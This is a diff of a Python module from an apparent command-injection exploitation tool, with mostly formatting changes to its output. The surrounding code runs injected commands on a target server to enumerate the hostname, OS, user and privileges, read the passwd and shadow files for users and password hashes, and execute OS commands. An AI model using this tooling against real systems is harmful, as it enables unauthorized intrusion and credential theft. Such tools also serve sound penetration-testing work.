@@ -38,7 +38,7 @@ def hostname(separator, maxlen, TAG, prefix, suffix, delay, http_request_method,
   shell = output 
   if shell:
     shell = "".join(str(p) for p in output)
-    sys.stdout.write(Style.BRIGHT + "\n\n  (!) The hostname is " + Style.UNDERLINE + shell + Style.RESET_ALL + ".\n")
+    sys.stdout.write(Style.BRIGHT + "\n\n  (!) The hostname is " + Style.UNDERLINE + shell + Style.RESET_ALL + ".\n\n")
     sys.stdout.flush()
     # Add infos to logs file. 
     output_file = open(filename, "a")
@@ -54,6 +54,7 @@ def system_information(separator, maxlen, TAG, prefix, suffix, delay, http_reque
   check_how_long, output  = tfb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
   target_os = output
   if target_os:
+    print ""
     target_os = "".join(str(p) for p in output)
     if target_os == "Linux":
       cmd = settings.RECOGNISE_HP
@@ -62,7 +63,7 @@ def system_information(separator, maxlen, TAG, prefix, suffix, delay, http_reque
       if target_arch:
         target_arch = "".join(str(p) for p in target_arch)
         sys.stdout.write(Style.BRIGHT + "\n\n  (!) The target operating system is " + Style.UNDERLINE + target_os + Style.RESET_ALL)
-        sys.stdout.write(Style.BRIGHT + " and the hardware platform is " + Style.UNDERLINE + target_arch + Style.RESET_ALL + ".\n")
+        sys.stdout.write(Style.BRIGHT + " and the hardware platform is " + Style.UNDERLINE + target_arch + Style.RESET_ALL + ".\n\n")
         sys.stdout.flush()
         # Add infos to logs file.   
         output_file = open(filename, "a")
@@ -70,7 +71,7 @@ def system_information(separator, maxlen, TAG, prefix, suffix, delay, http_reque
         output_file.write(" and the hardware platform is " + target_arch + ".\n")
         output_file.close()
     else:
-      sys.stdout.write(Style.BRIGHT + "\n  (!) The target operating system is " + Style.UNDERLINE + target_os + Style.RESET_ALL + ".\n")
+      sys.stdout.write(Style.BRIGHT + "\n  (!) The target operating system is " + Style.UNDERLINE + target_os + Style.RESET_ALL + ".\n\n")
       sys.stdout.flush()
       # Add infos to logs file.    
       output_file = open(filename, "a")
@@ -103,21 +104,21 @@ def current_user(separator, maxlen, TAG, prefix, suffix, delay, http_request_met
         output_file.write("    (!) The current user is " + cu_account)
         output_file.close()
         if is_root != "0":
-            sys.stdout.write(Style.BRIGHT + " and it is " + Style.UNDERLINE + "not" + Style.RESET_ALL + Style.BRIGHT + " privilleged" + Style.RESET_ALL + ".\n")
+            sys.stdout.write(Style.BRIGHT + " and it is " + Style.UNDERLINE + "not" + Style.RESET_ALL + Style.BRIGHT + " privilleged" + Style.RESET_ALL + ".\n\n")
             sys.stdout.flush()
             # Add infos to logs file.   
             output_file = open(filename, "a")
             output_file.write(" and it is not privilleged.\n")
             output_file.close()
         else:
-          sys.stdout.write(Style.BRIGHT + " and it is " + Style.UNDERLINE + "" + Style.RESET_ALL + Style.BRIGHT + " privilleged" + Style.RESET_ALL + ".\n")
+          sys.stdout.write(Style.BRIGHT + " and it is " + Style.UNDERLINE + "" + Style.RESET_ALL + Style.BRIGHT + " privilleged" + Style.RESET_ALL + ".\n\n")
           sys.stdout.flush()
           # Add infos to logs file.   
           output_file = open(filename, "a")
           output_file.write(" and it is privilleged.\n")
           output_file.close()
     else:
-      sys.stdout.write(Style.BRIGHT + "\n\n  (!) The current user is " + Style.UNDERLINE + cu_account + Style.RESET_ALL + ".\n")
+      sys.stdout.write(Style.BRIGHT + "\n\n  (!) The current user is " + Style.UNDERLINE + cu_account + Style.RESET_ALL + ".\n\n")
       sys.stdout.flush()
       # Add infos to logs file.   
       output_file = open(filename, "a")
@@ -128,9 +129,10 @@ def current_user(separator, maxlen, TAG, prefix, suffix, delay, http_request_met
 System users enumeration
 """
 def system_users(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename): 
-  sys.stdout.write("\n(*) Fetching '" + settings.PASSWD_FILE + "' to enumerate users entries... ")
+  sys.stdout.write("(*) Fetching '" + settings.PASSWD_FILE + "' to enumerate users entries... ")
   sys.stdout.flush()
-  cmd = settings.SYS_USERS             
+  cmd = settings.SYS_USERS   
+  print ""                  
   check_how_long, output  = tfb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
   sys_users = output
   if sys_users :
@@ -178,16 +180,17 @@ def system_users(separator, maxlen, TAG, prefix, suffix, delay, http_request_met
         output_file.write("      ("+str(count)+") '" + fields[0]+ "'" + is_privilleged_nh + "(uid=" + fields[1] + "). Home directory is in '" + fields[2] + "'.\n" )
         output_file.close()
     else:
-      print "\n" + Back.RED + "(x) Error: Cannot open '" + settings.PASSWD_FILE + "'." + Style.RESET_ALL
+      print Back.RED + "(x) Error: Cannot open '" + settings.PASSWD_FILE + "' to enumerate users entries." + Style.RESET_ALL + "\n"
 
 
 """
 System passwords enumeration
 """
 def system_passwords(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename): 
-  sys.stdout.write("\n(*) Fetching '" + settings.SHADOW_FILE + "' to enumerate users password hashes... ")
+  sys.stdout.write("(*) Fetching '" + settings.SHADOW_FILE + "' to enumerate users password hashes... ")
   sys.stdout.flush()
-  cmd = settings.SYS_PASSES            
+  cmd = settings.SYS_PASSES
+  print ""                    
   check_how_long, output  = tfb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
   sys_passes = output
   if sys_passes :
@@ -211,14 +214,15 @@ def system_passwords(separator, maxlen, TAG, prefix, suffix, delay, http_request
           output_file = open(filename, "a")
           output_file.write("      ("+str(count)+") " + fields[0] + " : " + fields[1])
           output_file.close()
-    else:
-      print "\n" + Back.RED + "(x) Error: Cannot open '" + settings.SHADOW_FILE + "'." + Style.RESET_ALL
+  else:
+    print Back.RED + "(x) Error: Cannot open '" + settings.SHADOW_FILE + "' to enumerate users password hashes." + Style.RESET_ALL + "\n"
 
 
 """
 Single os-shell execution
 """
 def single_os_cmd_exec(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename):
+
   cmd =  menu.options.os_cmd
   check_how_long, output = tfb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
   return check_how_long, output
@@ -230,10 +234,13 @@ Check the defined options
 def do_check(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename):
   
   if menu.options.hostname:
+    if settings.ENUMERATION_DONE == False:
+      print ""
     hostname(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
     settings.ENUMERATION_DONE = True
   else:
-    print ""
+    if settings.ENUMERATION_DONE == False:
+      print ""
 
   if menu.options.current_user:
     current_user(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
@@ -250,8 +257,5 @@ def do_check(separator, maxlen, TAG, prefix, suffix, delay, http_request_method,
   if menu.options.passwords:
     system_passwords(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
     settings.ENUMERATION_DONE = True
-
-  if settings.ENUMERATION_DONE == True:
-    print ""
 
 # eof
